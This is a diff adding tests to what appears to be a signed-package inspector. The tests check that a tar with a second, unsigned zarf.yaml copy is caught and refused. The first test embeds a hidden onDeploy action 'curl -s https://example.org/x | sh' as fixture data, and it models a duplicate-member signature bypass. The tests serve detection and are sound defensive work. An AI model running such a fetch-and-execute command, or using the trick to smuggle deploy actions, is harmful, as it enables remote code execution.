@@ -224,6 +224,52 @@ def test_host_actions_and_files_are_reported(tmp_path: Path) -> None:
     ]
 
 
+def _tar_with_copies(members: list[tuple[str, bytes]]) -> bytes:
+    """A tar that may hold a name more than once (``tar()`` takes a mapping)."""
+    import io
+    import tarfile
+
+    buffer = io.BytesIO()
+    with tarfile.open(fileobj=buffer, mode="w", format=tarfile.PAX_FORMAT) as archive:
+        for name, data in members:
+            info = tarfile.TarInfo(name)
+            info.size = len(data)
+            archive.addfile(info, io.BytesIO(data))
+    return buffer.getvalue()
+
+
+def test_a_second_definition_cannot_hide_behind_a_signed_first(tmp_path: Path) -> None:
+    """Extraction keeps the last copy of zarf.yaml; the signature covers the first."""
+    signer = KeySigner()
+    policy = _policy(tmp_path / "keys", "x509", signer.public_pem)
+    members = build(signer=signer)
+    hidden = yaml.safe_load(members["zarf.yaml"])
+    hidden["components"][0]["actions"] = {
+        "onDeploy": {"before": [{"cmd": "curl -s https://example.org/x | sh"}]}
+    }
+    data = _tar_with_copies(
+        [*members.items(), ("zarf.yaml", yaml.safe_dump(hidden, sort_keys=False).encode())]
+    )
+    result = inspect(write(tmp_path / "d", {NAME: data}), policy_yaml=policy)
+
+    (conflict,) = _failed(result, "package.member.conflicting-copies")
+    assert conflict["files"][0]["file"] == "zarf.yaml"
+    assert findings_of(result)["package.member.conflicting-copies"][0].severity.value == "critical"
+    (actions,) = _failed(result, "zarf.component.actions")
+    assert [a["cmd"] for a in actions["actions"]] == ["curl -s https://example.org/x | sh"]
+    component = artifact(result, f"{NAME}!/components/app.tar")
+    assert component.verifications == ()  # the signature vouches for nothing now
+    assert result.assessment.summary.verdict.value == "refused"
+
+
+def test_identical_copies_are_not_a_conflict(tmp_path: Path) -> None:
+    members = build()
+    data = _tar_with_copies([*members.items(), ("checksums.txt", members["checksums.txt"])])
+    result = inspect(write(tmp_path / "d", {NAME: data}))
+    assert "package.member.conflicting-copies" not in findings_of(result)
+    assert "archive.member.duplicate" in findings_of(result)  # still reported, as a policy matter
+
+
 # --- the signature ------------------------------------------------------------------------------
 
 
